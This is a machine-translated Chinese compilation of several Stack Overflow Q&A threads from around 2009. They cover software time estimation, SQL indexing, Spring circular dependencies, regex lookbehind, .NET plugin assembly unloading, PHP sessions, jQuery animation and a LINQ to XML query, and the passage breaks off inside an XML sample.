如果你能建议他们应该“请坚持说我以后永远不会给你这种类型的可靠估计。如果我尝试就解雇我”，那将是非常好的。

*（夸大了，但只是轻微的。）*

* * *

## 回答 #8

> 赞同：7
> 
> 时间：2009-01-15T13:56:42.347

甚至不要试图估计。你的估计不可能是正确的。毕竟只是一个估计。

相反，我建议您将功能分成小块（不超过 1-2 天），并尝试将这些小块作为工作、完整、可测试和有价值的代码交付给客户/经理。这样，他就会亲眼看到你每天的进步。这也意味着他实际上可以决定一旦满足就停止开发并认为它已经完成，即使它可能没有达到所有目标。

查看敏捷实践“发布计划”和“迭代计划”以获取有关此方法的更深入信息。

* * *

## 回答 #9

> 赞同：6
> 
> 时间：2009-01-08T17:08:31.393

请记住，如果您要求更大的时间估算但按时进行，它看起来比估算不足并不得不要求延期要好得多。

我会尝试模拟一个原型，以便您更好地了解它将花费的时间。对你的管理层诚实，这样他们就可以为学习曲线中的意外延迟做预算。

**编辑：**您可能还会查看是否可以获得更“迭代”的截止日期。在“Pragmatic Thinking and Learning”中，Andy Hunt 提出了一个很好的观点，即人们是接近项目结束的项目专家，并且在一开始时知识最少。当每个人都对项目了解最少的时候，在一开始就进行所有的设计和时间估算是没有多大意义的。如果您“迭代”截止日期并分块解决问题，您将获得更大的成功。

* * *

## 回答 #10

> 赞同：5
> 
> 时间：2009-01-08T17:13:24.067

很多准确的估计是自知之明。如果你写了很多代码，如果你必须学习很多 API，你就会开始对以下问题有所了解：

*   我需要多长时间来学习一个新的 API？
*   我需要多长时间才能学习一门新语言？
*   我需要多长时间来学习一个新的工具集（编译器/链接器/IDE）？
*   我完成一项典型任务需要多长时间？
*   我需要多长时间来测试我的工作？
*   我需要多长时间来部署我的工作？

在整个过程中，您应该对以下内容有所了解：

*   您创建了多少个典型错误以及它们是如何分类的（即，容易的、困难的、不可能的）
*   引入了多少复杂性（即，由于缺少 3rd 方 API 或错误 API 需要重构；由于对能力的误解需要重新设计；非标准工具/构建过程）
*   由于中断/外部问题而浪费了多少时间

基于所有这些，即使面对非常不完整的信息，您也将能够了解某件事需要多长时间，并能够陈述您的假设（“假设 API 是健全的......”）。

* * *

## 回答 #11

> 赞同：5
> 
> 时间：2009-01-08T17:13:31.273

估计你需要多长时间才能学会足够的知识来做出更好的估计，例如，“我不知道：我以前从来没有用过这个。我可能需要*在此处插入你的估计*才能弄清楚*什么你需要了解它*，我必须先了解它，然后我才能给你一个很好的估计，以便用它来完成*你的项目*。”

* * *

## 回答 #12

> 赞同：3
> 
> 时间：2009-01-08T17:09:10.673

您只需猜测一个外部数字并立即进行评估，让他们知道未来的信息可能会影响您的估计，但您会及时更新。

在您评估时，让他们了解情况——通过在网络上发布的文档或每周更新，但始终包括更新的“预计结束日期”，以及延期的原因（如果有的话）。

大多数经理应该明白这一点——通过询问结束日期，他们实际上是在说“给我们一些想法，我们可以如何计划我们的日程安排”和“不要永远拖延”。

如果您最终延长超过一两次，请根据您在估算方面的新知识重新评估您的整个日程安排。

* * *

## 回答 #13

> 赞同：3
> 
> 时间：2009-01-08T17:29:41.833

在编程时，我总是采用我真正认为需要的东西并将其乘以 3 来提供估计值。如果我认为我可以在 1 周内完成一项工作，我会告诉客户需要 3 周——如果我认为我真的需要 3 周，我会告诉客户需要 9 周。

通过这样做，我将自己设置为“承诺不足，交付过多”——如果你能成功地做到这一点，你的生活会好得多，你的客户也会非常高兴。

在您的情况下，您肯定希望在提供估算之前至少对您正在研究的内容有所了解。也许您甚至需要估计提供估计需要多长时间。乘以 3 让客户满意。

* * *

## 回答 #14

> 赞同：3
> 
> 时间：2009-01-08T22:33:57.773

把它分解成你确实有一些经验的事情。切碎它的行为会让你更好地了解你知道什么和不知道什么。

一旦这些碎片足够小以至于它们可以被视为单个定义的任务，其中一些将是完全不可估量的。对于那些，要么先做原型，要么给自己留一些合理的时间，这取决于作品的大小。如果你发现你有比 2-4 周的工作更大的不可估量的碎片，那就先回去把它们切碎。

最终，您会遇到一些非常奇怪的技术解决方案（您认为应该有效，但不确定），并且一旦有效，就需要做大量工作来支持这些东西。会有一些缺失的设计，最好为初始版本选择一些知名的库或非常简单的算法。

如果你不能分解任务，那么你应该雇佣一个有足够经验的人（因为你缺乏经验也会以其他方式困扰你）。如果你不能雇用某人，那么你应该随机讨价还价（6 个月到 2 年），然后直接进入一个凌乱的原型（直到你设法给自己足够的经验来知道什么是正确的，什么是正确的）错误的）。但是，如果你最终失败了，重要的是不要自欺欺人并认为你正在做正确的“方式”。原型本来是要扔掉的。希望原型倒计时完成后，您就可以真正构建它了。

保罗。

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2009-01-08T17:12:00.917

我想补充一下 RB 所说的话，当我发现自己处于这种情况时，我会估计使用我熟悉的工具需要多长时间，然后将该估计加倍以建立一些学习曲线。

重要的部分是与管理层沟通，估计是**猜测**，如果他们要求更准确的估计，或者他们试图 - 亲爱的上帝 -**卖给**你一个时间限制（当然，建造星际飞船只需要**你**2 天）企业，你很好）**坚持你的枪**，不要妥协你的估计，或者它不可靠的事实。

如果管理层凌驾于您之上，并为任务设置时间，例如“嗯，必须在 2 天内完成”，再次让他们知道这是**他们的**估计，这与您的估计一样可靠。

把这一切都写下来。

* * *

## 回答 #16

> 赞同：2
> 
> 时间：2009-01-08T20:00:39.110

我在工作中经常处理估算，这是一个真正的挑战。我最大的挑战之一是在不知道该开发人员的技能水平的情况下，估计不同的开发人员完成一项任务需要多长时间。

虽然您可能会看到“承诺不足，交付不足”的方法取得了一些初步成功，但随着时间的推移，您会发​​现其他遵循“过度承诺，​​交付不足”思想流派的人会超过您。无论哪种方式，缺乏准确性都会反过来咬你。准确性与经验密切相关，并限制了该技术的未知数。

我建议的一件事是了解您的估算将针对哪种预算。如果你的预算很少，不要对不熟悉的技术发疯，坚持你所知道的。如果您的预算更灵活一点，那么您可以进行一些试验。

还要认识到，在某些任务中，您只能提供 Wild Ass Guess (WAG)。对于这些，您应该为您的估计设置一个最短时间，并明确表示您不知道最大值是多少。通常，这种估计足以使某些功能/需求被管理层删除。

* * *

## 回答 #17

> 赞同：2
> 
> 时间：2013-04-15T11:51:51.320

这是项目经理和程序员都可能拥有（当然也可能掌握！）的一项不可或缺的技能，我发现了一篇文章，*[估计软件开发任务变得（一点点）更容易](http://www.contentedcoder.com/2012/03/estimating-software-development.html)*，我希望它有助于更​​好地估计项目的任务。

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2009-01-08T17:13:42.787

这是一个非常普遍的情况：处理未知的必要性。解决这个问题的一个有用方法是意识到除了实际的编程任务之外，你还有一些学习要做——管理层应该意识到这一点。

当你遇到这种情况时，项目突然变成了研发项目，比平时更长的时间不会让你看起来很糟糕，因为你正在学习和制作程序。我不知道你的学习速度有多快，或者你有什么资源来处理你可能发现的任何问题（Stack Overflow 是你的选择之一）。

我会说你应该像往常一样估计，然后乘以 1.5（如果你是一个快速学习者并且可以访问资源来解决你的问题），或者如果你是一个普通的学习者并且只依靠自己，则乘以 2.5。

我希望这有帮助！

* * *

## 回答 #19

> 赞同：1
> 
> 时间：2009-01-08T17:20:53.567

上述所有回复几乎涵盖了有关估算本身的所有内容。

我要强调的一件事是跟踪您的估计（一个小的 Excel 电子表格，如果它非常简单，甚至是记事本文档），并在每天结束时将其更新为您现在可以提供的最准确的数字. 即使您不需要将其反馈给您的老板，保持更新也能让您更好地了解事情的进展情况，更重要的是，您会很好地了解您的估算*为何*会随着工作的进展而变化.

这样做会让你更好地估计未来，无论是对于这项特定技术还是你以前没有使用过的其他技术，仅仅是因为它需要你在一定程度上注意到你的期望何时会定期发生变化，并找出发生这种情况的原因.

* * *

## 回答 #20

> 赞同：1
> 
> 时间：2009-01-08T17:29:16.297

估计某件事需要多长时间是你工作的一部分。只要它被理解为估计而不是截止日期，您就不必担心。没有人比编写代码的人更适合提供估算了。如果你不能提供一个好的估计，那么你需要让管理层意识到你的错误估计所带来的风险，这样他们就可以重新考虑是否值得冒险针对这些未知的第三方控制进行编程。

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2009-01-08T17:10:10.047

能给个范围吗？40-60小时，类似的东西？

任务越小越困难，如果你可以将它们分组，你会有更多的“slop”，因为错误可能会在项目结束时平衡。

看看你有经验的任何领域，如果作为指导的话。“上次需要创建一个更改数据库的功能，我花了 X”。祝你好运。

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2009-01-08T17:16:19.723

尽最大努力将任务分成可管理的部分。运气好的话，有些特定任务与所涉及的第 3 方组件相关，而其他一些耦合较少（因此更容易估计）。向管理层提供拆分估计，并指出最不确定的估计在哪里。

我完全同意任何建议玩并制作原型的人。为原型制作活动设置一个固定的时间框。（“我需要两天时间才能使我的这部分估计更好。”）

# sql - 索引或不索引

> ID：425047
> 
> 赞同：0
> 
> 时间：2009-01-08T17:02:31.030
> 
> 标签：sql, indexing, sql-server-2000

我有一个专门用于记录用户操作的数据库。该数据库有一些针对特定类型操作的小表。这些数据很少被搜索，但表的行数开始攀升至数百万。我没有注意到很大的减速，但我想知道索引表进行搜索是否会阻碍或帮助插入的性能。插入会不断执行，但搜索不会经常发生，并且表只会不断增长。

我应该在这些表上创建索引吗？为什么或者为什么不？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-08T17:05:19.900

这一切都取决于您的实证研究。将数据库的副本放到不同的环境中，并在运行搜索和插入时运行探查器（带索引和不带索引）。衡量性能，看看有什么帮助。:)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-08T17:04:51.120

而不是索引，我认为您应该考虑在插入行的表上没有索引，然后复制表（并可能应用索引）以专门用于查询。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-08T17:34:12.340

正如[雷所说](https://stackoverflow.com/a/425060/50776)，这完全取决于情况，唯一的判断方法是在负载下尝试。

从理论上讲：是的，向表中添加索引会减慢插入速度，因为 DBMS 必须在每次插入时维护所有索引。但是你会注意到吗？观察到的性能是否重要？也许不吧。索引通常保存在 B+ 树结构中，可以在 O(log n) 时间内插入，这非常好，更不用说所有的磁盘缓存等。所以唯一确定的方法是尝试两者方法，看看有什么区别。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T18:34:55.710

我不是 Sql Server 专家，但我曾与 Microsoft 高级工程师一起研究我们其中一个系统的性能。据他介绍，MSSS 找到要插入新行的页面的方式是通过“可用空间扫描”……扫描每个页面，寻找有空间插入行的页面。

如果将聚集索引添加到表中，则会强制数据进入一个特定位置。假设您向该表添加了一个自动编号列并使其成为聚集索引。现在 MSSS 不会扫描空闲块，它知道 1000**必须紧跟**在 999 之后；所以它会遍历索引 a 。

我会试一试。尝试 4 或 500 万行不应该花费太长时间。

# java - 如何在 Spring 中连接相互依赖的 bean？

> ID：425049
> 
> 赞同：19
> 
> 时间：2009-01-08T17:02:53.447
> 
> 标签：java, spring, dependency-injection

我想声明两个bean并使用Spring依赖注入实例化它们？

```
<bean id="sessionFactory" class="SessionFactoryImpl">
 <property name="entityInterceptor" ref="entityInterceptor"/>
</bean>

<bean id="entityInterceptor" class="EntityInterceptorImpl">
 <property name="sessionFactory" ref="sessionFactory"/>
</bean> 
```

但是 Spring 抛出一个异常，说“当前正在创建的 FactoryBean 从 getObject 返回 null”

为什么相互依赖的 bean 布线在这里不起作用？我应该在任何地方指定延迟属性绑定吗？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-01-08T17:10:22.027

不幸的是容器初始化在 Spring 中的工作方式，一个 bean 只能在完全初始化后注入另一个 bean。在您的情况下，您有一个循环依赖关系，它会阻止初始化任何一个 bean，因为它们相互依赖。为了解决这个问题，您可以在其中一个 bean 中实现 BeanFactoryAware，并使用 beanFactory.getBean("beanName") 获取对另一个 bean 的引用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-08T17:23:13.750

neesh 是对的，Spring 并不是开箱即用的。

相互依赖的 bean 暗示了一个设计问题。做到这一点的“干净”方法是重新设计您的服务，使其没有这种奇怪的依赖关系，当然前提是您可以控制实现。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-08T17:34:50.090

您可以实现设置依赖项的[BeanPostProcessor](http://static.springframework.org/spring/docs/2.5.x/api/org/springframework/beans/factory/config/BeanPostProcessor.html)。

或者...

请参阅 Costin 的回复：

[http://forum.springframework.org/showthread.php?t=19569&highlight=circular+dependencies](http://forum.springframework.org/showthread.php?t=19569&highlight=circular+dependencies)

在此处查看 Andreas 的回复：

[http://forum.springframework.org/showthread.php?t=29572&highlight=circular+dependencies](http://forum.springframework.org/showthread.php?t=29572&highlight=circular+dependencies)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T20:30:35.587

您可以扩展正在使用的 ApplicactionContext 并覆盖方法 createBeanFactory()

```
 protected DefaultListableBeanFactory createBeanFactory(){
    DefaultListableBeanFactory beanFactory = super.createBeanFactory();
    // By default this is false;
    beanFactory.setAllowRawInjectionDespiteWrapping( true );
    return beanFactory;
 } 
```

这可行，但要小心，因为这允许循环引用。

# html - 在数千个表单上验证操作属性

> ID：425068
> 
> 赞同：0
> 
> 时间：2009-01-08T17:07:55.887
> 
> 标签：html, validation

我继承了一张带有数千个`<form action="page.html" method="get"><input type="submit" value="Go"></form>`按钮的课件 CD。

其中一些表单指向不存在的页面，我真的很想使用自动化测试工具/爬虫来测试它们。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-08T17:13:05.580

WATIR 或 WATIN 可以帮助您，特别是如果提交按钮的值始终为“GO”或类似的值。

另一种选择是创建一个小应用程序，它读取每个 html 文件，找到表单元素，获取操作值并查看所述文件是否存在，如果不存在，则记录它然后进入下一个文件

# c# - 正则表达式环视

> ID：425071
> 
> 赞同：1
> 
> 时间：2009-01-08T17:08:50.707
> 
> 标签：c#, .net, regex

我认为仅使用正则表达式是不可能的，但我不是专家，所以我认为值得一问。

我正在尝试使用 .NET 正则表达式对 C# 代码进行大量搜索和替换。我想要做的是找到一行代码，其中在 DateTime 类型的变量上调用特定函数。例如：

```
axRecord.set_Field("CreatedDate", m_createdDate); 
```

我会知道它是该代码文件中较早的 DateTime 变量 b/c 将是以下行：

```
DateTime m_createdDate; 
```

但似乎我不能在负面回顾中使用命名组，例如：

```
(?<=DateTime \k<1>.+?)axRecord.set_[^ ]+ (?<1>[^ )]+) 
```

如果我尝试匹配变量声明和函数调用之间的所有文本，如下所示：

```
DateTime (?<1>[^;]+).+?axRecord.set.+?\k<1> 
```

它将找到第一个匹配项 - 首先基于声明的第一个变量 - 但随后找不到任何其他匹配项，因为代码的布局如下：

```
DateTime m_First;
DateTime m_Second;
...
axRecord.set_Field("something", m_First);
axRecord.set_Field("somethingElse", m_Second); 
```

第一个匹配包含第二个变量声明。

有没有一种只用正则表达式来做到这一点的好方法，还是我必须在我的逻辑中求助于脚本？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-08T17:20:33.240

看看我对这个问题的回答[Get a methods contents from a C# file](https://stackoverflow.com/questions/261741/get-a-methods-contents-from-a-cs-file#261861)

它提供了指向页面的链接，这些页面显示了如何使用内置的 .net 语言解析器来简单可靠地执行此操作（即不是通过询问“我正在搜索的用法看起来像什么”，而是通过使用 VS 代码正确解析代码）解析工具）。

我知道这不是 RegEx 的答案，但我不认为 RegEx 是答案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T17:19:06.690

使用单个正则表达式很难做到这一点。但是，如果您考虑处理带有一些状态的行，则可以这样做。

注意：我无法准确地告诉您要在 axRecord 行上匹配的内容，因此您可能需要适当地调整该正则表达式。

```
void Process(List<string> lines) {
  var comp = StringComparer.Ordinal;
  var map = new Hashset<string>comp);
  var declRegex = new Regex("^\s(?<type>\w+)\s*(?<name>m_\w+)\s*";);
  var toReplaceRegex = new Regex("^\s*axRecord.set_(?<toReplace>.*(?<name>m_\w+).*)");

  for( var i = 0; i < lines.Length; i++) {
    var line = lines[i];
    var match = declRegex.Match(line);
    if ( match.Success ) {
      if ( comp.Equals(match.Groups["type"], "DateTime") ) {
        map.Add(comp.Groups["name"]);
      } else {
        map.Remove(comp.Groups["name"]);
      }
      continue;
    }

    match = toReplaceRegex.Match(line);
    if ( match.Success && map.Contains(match.Groups["name"]) ) {
      // Add your replace logic here
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T17:19:11.557

这不能使用正则表达式来完成。一方面，C# 的语法不规则；但更重要的是，您正在谈论分析词汇上不相关的表达式。对于这类事情，您将需要完整的语义分析。这意味着词法分析器、解析器、名称绑定以及最后的类型检查器。获得带注释的 AST 后，您可以查找所需的字段并读取类型。

我猜这比你想做的工作要多得多，因为它大约是成熟 C# 编译器的一半。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T18:22:28.153

这很奇怪。我设法构建了一个可以找到它的正则表达式，但它只匹配第一个。

```
(?<=private datetime (?<1>\b\w+\b).+?)set_field[^;]+?\k<1> 
```

所以看起来如果我不能在lookbehind中使用命名组，我至少可以在lookbehind中*建立*一个命名组，并在匹配中使用它。但是看起来当它只匹配函数调用（这是我想要的）时，插入符号的位置被移动到该行，因此它找不到任何新的匹配项，因为它已经传递了他们的声明。或者我不明白引擎是如何工作的。

我想我正在寻找的是一个正则表达式选项，它告诉它在匹配项中查找更多匹配项。想到这一点，似乎基本的 html 正则表达式解析也需要这样做。您找到一个标签，然后它是结束标签，整个页面都包含在该匹配项中，因此除非您将模式递归应用于每个匹配项，否则您将找不到任何其他标签。

有人知道这件事还是我说疯了？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-09T10:49:41.593

试试这个：

```
@"(?s)set_Field\(""[^""]*"",\s*(?<vname>\w+)(?<=\bDateTime\s+\k<vname>\b.+)" 
```

通过先进行向后查找，您将强制正则表达式以特定顺序搜索方法调用：声明变量的顺序。您要做的是首先匹配一个看起来很可能的方法调用，然后使用lookbehind 来验证变量的类型。

我只是对与方法调用匹配的部分进行了粗略的猜测。就像其他人所说的那样，您使用的任何正则表达式都必须根据您的代码进行定制；没有通用的解决方案。

# c# - 如何在 AppDomain.Unload(domain) 之后删除插件程序集

> ID：425077
> 
> 赞同：18
> 
> 时间：2009-01-08T17:10:37.753
> 
> 标签：c#, plugins, assemblies

我有一个奇怪的问题。我想删除已经加载的程序集（硬盘上的plugin.dll），但程序集被操作系统（vista）锁定，即使我已经卸载它。

铁

```
AppDomainSetup setup = new AppDomainSetup();
setup.ShadowCopyFiles = "true";
AppDomain appDomain = AppDomain.CreateDomain(assemblyName + "_AppDomain", AppDomain.CurrentDomain.Evidence, setup);
IPlugin plugin = (IPlugin)appDomain.CreateInstanceFromAndUnwrap(assemblyName,                        "Plugin.MyPlugins"); 
```

我还需要assemblyinfos，因为我不知道pluginassembly 中的哪些类实现了IPlugin 接口。一个插件程序集中应该可以有多个插件。

```
Assembly assembly = appDomain.Load(assemblyName);
if (assembly != null) {
   Type[] assemblyTypes = assembly.GetTypes();
   foreach (Type assemblyTyp in assemblyTypes) {
      if (typeof(IPlugin).IsAssignableFrom(assemblyTyp)) {
         IPlugin plugin = (IPlugin)Activator.CreateInstance(assemblyTyp);
         plugin.AssemblyName = assemblyNameWithEx;
         plugin.Host = this;
      }
   }
}
AppDomain.Unload(appDomain); 
```

如何在不锁定程序集的情况下从 appDomain 获取程序集信息？

最好的祝福

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2009-01-12T16:26:20.423

我想我有答案了！如果您想删除加载的程序集，Øyvind Skaar 的答案将不起作用。

代替

```
using (FileStream dll = File.OpenRead(path))
{
   fileContent = new byte[dll.Length];
   dll.Read(fileContent, 0, (int)dll.Length);
}
Assembly assembly = appDomain.Load(fileContent); 
```

你必须使用

```
byte[] b = File.ReadAllBytes(assemblyName);
assembly = Assembly.Load(b); 
```

最好的祝福

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2010-03-19T05:36:42.967

我知道这个线程已经死了，但我目前正在处理这个问题，我刚刚得到了答案（凌晨 1 点 30 分......）

```
AppDomainSetup setup = new AppDomainSetup();
setup.ApplicationBase = AppDomain.CurrentDomain.BaseDirectory;
AppDomain app = AppDomain.CreateDomain("YaCsi", null, setup);
app.DoCallBack(LoaderCallback);
AppDomain.Unload(app);
File.Delete("__YaCsi_Test01.dll");

static void LoaderCallback()
{
    byte[] raw = File.ReadAllBytes("__YaCsi_Test01.dll");
    Assembly yacsi = Assembly.Load(raw);
    ((IScript)yacsi.CreateInstance("Script")).Go();
} 
```

它实际上不会抛出任何异常！！！希望有人会读到这个，它会回答那里的问题！

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-02-29T14:34:47.580

请参阅以下页面：

*   [http://connect.microsoft.com/VisualStudio/feedback/details/536783/vsip-assembly-file-handles-not-being-released-after-appdomain-unload](http://connect.microsoft.com/VisualStudio/feedback/details/536783/vsip-assembly-file-handles-not-being-released-after-appdomain-unload)

*   [http://msdn.microsoft.com/it-it/library/43wc4hhs.aspx](http://msdn.microsoft.com/it-it/library/43wc4hhs.aspx)

设置一个新`AppDomain AppDomainSetup`的`LoaderOptimization.MultiDomainHost`

例如

```
domainnew = AppDomain.CreateDomain(newdomain_name, null, new AppDomainSetup {
        ApplicationName = newdomain_name,
        ApplicationBase = assembly_directory,
        ConfigurationFile = ConfigurationManager.OpenExeConfiguration(assemblylocation).FilePath,
        LoaderOptimization = LoaderOptimization.MultiDomainHost,
        ShadowCopyFiles = shadowcopy ? "true" : "false",
    }
); 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-01-11T15:50:05.270

如果您将程序集作为流加载，它应该可以工作。

```
byte[] fileContent;
string path = "../../../test/bin/Debug/test.dll"; //Path to plugin assembly
using (FileStream dll = File.OpenRead(path))
{
   fileContent = new byte[dll.Length];
   dll.Read(fileContent, 0, (int)dll.Length);
}
Assembly assembly = appDomain.Load(fileContent);
File.Delete(path); 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-01-08T17:32:40.377

我们所做的是拥有一个监视程序集的文件夹。添加程序集时，应用程序会将其复制到临时目录，并为其提供唯一的文件名并从那里加载它。

首次加载应用程序时，它会尝试清除临时目录。

我认为这不能直接回答您的问题，但它可能会解决您的问题。

# php - 将 AJAX 调用中的 PHP var 传递到另一个页面更好：POST 还是通过会话？

> ID：425078
> 
> 赞同：0
> 
> 时间：2009-01-08T17:11:27.737
> 
> 标签：php, ajax, session, post

在我正在构建的 PHP 站点中，我使用 Prototype AJAX 调用来处理其他一些 php 页面。这个称为 php 的页面需要一个变量，该变量在第一页上作为 SESSION var 存在（从某种意义上说，它在整个页面中被多次使用）。

这比其他任何事情都更令人好奇，但是：如果有的话，两种传递变量的方法中哪一种更可取：

*   在被调用页面上，启动会话并从那里获取所需的 var，或者
*   在 AJAX 调用中，将会话变量作为 POST 参数传递

所以，我很好奇在页面之间传递 POST 变量是否有更高的“成本”，而不是从会话中获取变量（添加 session_start() 等）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-08T17:21:52.863

如果该值没有安全问题，请通过 GET 或 POST 方法传递它。只有 ff 值存在一些安全问题，或者如果用户要更改值（通过代理或注入）然后使用 SESSION，这可能是一个严重的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T20:28:36.107

我会说使用会话。
您已经承受了在请求标头中发送会话 id 的开销，因此您不妨利用它。话虽如此，这并不是一个巨大的开销，但也不是发布少量数据。
为了发布数据，您还需要在客户端提供它，如果这是您在客户端拥有它的唯一原因，那么您已经让自己不必要地受到欺骗。
跨负载平衡服务器的可扩展性，如果它被证明是一个问题，那么如果您使用会话，无论如何都必须处理。
因此，如果您的会话有效，请使用它们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T17:16:27.087

使用 POST 方法很容易集群服务器，因为在服务器端记住的状态较少，但代价是向客户端发送可能敏感的数据。

使用 Session 方法，服务器和客户端之间传递的带宽更少，但更难跨多个前端 Web 服务器进行扩展。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-11T16:27:50.803

我实际上正在为您的问题寻找答案。

但是这就是我发现的：如果变量在第一页的会话上，这意味着你不能在“ajax 调用”页面上调用 session_start()。除非有一些我不知道的解决方法？

# jquery - jQuery背景彩色动画

> ID：425082
> 
> 赞同：6
> 
> 时间：2009-01-08T17:12:21.820
> 
> 标签：jquery, animation

我有一个带有链接和 SPAN 的 DIV。

单击链接时，它会使用 AJAX 呈现项目列表。单击某个项目时，SPAN 的内容会更改。

我想通过将 DIV 的背景颜色设置为绿色并使用 jQuery 将其设置为白色来突出显示此更改。

```
 var originalColor = elementToUpdate.parentNode.style.backgroundColor;
  elementToUpdate.style.backgroundColor = 'green'; //lastSender.style.color;
  jQuery(elementToUpdate.id).animate({ backgroundColor: '#ffffff' }, 1000); 
```

SPAN 的背景在第 2 行变为绿色，但第 3 行不执行任何操作。没有错误，也没有改变什么……

有任何想法吗？

* * *

**编辑：**正如 Ted Naleid 在下面的评论中指出的那样：

> 另请注意，您必须安装颜色动画插件才能使用（[http://plugins.jquery.com/project/color](http://plugins.jquery.com/project/color)），如果您没有安装它，jQuery 无法动画颜色，只有数字属性（至少从 1.3.1 开始）。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-01-08T17:20:42.677

`.id`如果您已经拥有该元素，则不需要。直接交给jQuery：

```
jQuery(elementToUpdate).animate({ backgroundColor: '#ffffff' }, 1000); 
```

您不会收到错误，因为`elementToUpdate.id`它是一个字符串，jQuery（可能）将其解释为选择器。它恰好是一个不选择任何东西的选择器。

或者，您可以这样说使其成为有效的选择器：

```
jQuery('#' + elementToUpdate.id).animate({ backgroundColor: '#ffffff' }, 1000); 
```

但我认为第一种形式更可取，因为您已经拥有元素本身。

# c# - 如何编写这个嵌套的 Linq To Xml 查询

> ID：425087
> 
> 赞同：4
> 
> 时间：2009-01-08T17:13:27.403
> 
> 标签：c#, xml, linq

嗨，我正在为医学研究编写应用程序，他们将输入性别、年龄和其他一些值，这些值将被计算为 ResultValue

现在我有一个 XML 文件，其中包含有关年龄、性别和 ResultValues 组合结果的一些信息，我想打印出 TestResult 的描述（如果先证者属于哪个组）需要注意的一点是我必须处理值范围，这意味着实际值介于低部分和高部分之间......我有三个组......好吧，这是我的 XML 文件

```
<?xml version="1.0" encoding="iso-8859-1"?>
 <Result>
        <ID>1</ID>
        <Description>You belong to Group 1</Description>
        <Genders>
            <Gender type="female">
                <Ages>
                    <Age low="18" high="24">
                        <ResultValue low="0" high="19"/>
                    </Age>
                    <Age low="25" high="34">
                        <ResultValue low="0" high="20"/>
                    </Age>
                    <Age low="35" high="44">
                        <ResultValue low="0" high="21"/>
                    </Age>
                    <Age low="45" high="54">
                        <ResultValue low="0" high="22"/>
                    </Age>
                    <Age low="55" high="64">
                        <ResultValue low="0" high="23"/>
                    </Age>
                    <Age low="65" high="110">
                        <ResultValue low="0" high="24"/>
                    </Age>
                </Ages>
            </Gender>
            <Gender type="male">
                <Ages>
                    <Age low="18" high="24">
                        <ResultValue low="0" high="19"/>
                    </Age>
                    <Age low="25" high="34">
                        <ResultValue low="0" high="20"/>
                    </Age>
                    <Age low="35" high="44">
                        <ResultValue low="0" high="21"/>
                    </Age>
                    <Age low="45" high="54">
                        <ResultValue low="0" high="22"/>
                    </Age>
                    <Age low="55" high="64">
                        <ResultValue low="0" high="23"/>
                    </Age>
                    <Age low="65" high="110">
                        <ResultValue low="0" high="24"/>
                    </Age>
                </Ages>
            </Gender>
        </Genders>
    </Result>
    <Result>
        <ID>2</ID>
        <Description>You belong to Group 2</Description>
        <Genders>
            <Gender type="female">
                <Ages>
                    <Age low="18" high="24">
                        <ResultValue low="19" high="24"/>
                    </Age>
                    <Age low="25" high="34">
                        <ResultValue low="20" high="25"/>

                    </Age>
                    <Age low="35" high="44">
                        <ResultValue low="21" high="26"/>
                    </Age>
                    <Age low="45" high="54">
                        <ResultValue low="22" high="27"/>
                    </Age>
                    <Age low="55" high="64">
                        <ResultValue low="23" high="28"/>
                    </Age>
                    <Age low="65" high="110">
                        <ResultValue low="24" high="29"/>
                    </Age>
                </Ages>
            </Gender>
            <Gender type="male">
                <Ages>
                    <Age low="18" high="24">
                        <ResultValue low="19" high="24"/>
                    </Age>
                    <Age low="25" high="34">
                        <ResultValue low="20" high="25"/>
                    </Age>
                    <Age low="35" high="44">
                        <ResultValue low="21" high="26"/>
                    </Age>
                    <Age low="45" high="54">
                        <ResultValue low="22" high="27"/>
                    </Age>
                    <Age low="55" high="64">
                        <ResultValue low="23" high="28"/>
                    </Age>
                    <Age low="65" high="110">
                        <ResultValue low="24" high="29"/>
                    </Age>
                </Ages>
            </Gender>
        </Genders>
    </Result>
    <Result>
        <ID>3</ID>
        <Description>You belong to group 3</Description>
        <Genders>
            <Gender type="female">
                <Ages>
                    <Age low="18" high="24">
                        <ResultValue low="24" high="29"/>
                    </Age>
                    <Age low="25" high="34">
                        <ResultValue low="25" high="30"/>

                    </Age>
                    <Age low="35" high="44">
                        <ResultValue low="26" high="31"/>
                    </Age>
                    <Age low="45" high="54">
                        <ResultValue low="27" high="32"/>
                    </Age>
                    <Age low="55" high="64">
                        <ResultValue low="28" high="33"/>
                    </Age>
                    <Age low="65" high="110">
                        <ResultValue low="29" high="34"/>
                    </Age>
                </Ages>
            </Gender>
            <Gender type="male">
                <Ages>
                    <Age low="18" high="24">
                        <ResultValue low="24" high="29"/>
                    </Age>
                    <Age low="25" high="34">
                        <ResultValue low="25" high="30"/>
                    </Age>
                    <Age low="35" high="44">
                        <ResultValue low="26" high="31"/>
                    </Age>
                    <Age low="45" high="54">
                        <ResultValue low="27" high="32"/>
                    </Age>
                    <Age low="55" high="64">
                        <ResultValue low="28" high="33"/>
                    </Age>
                    <Age low="65" high="110">
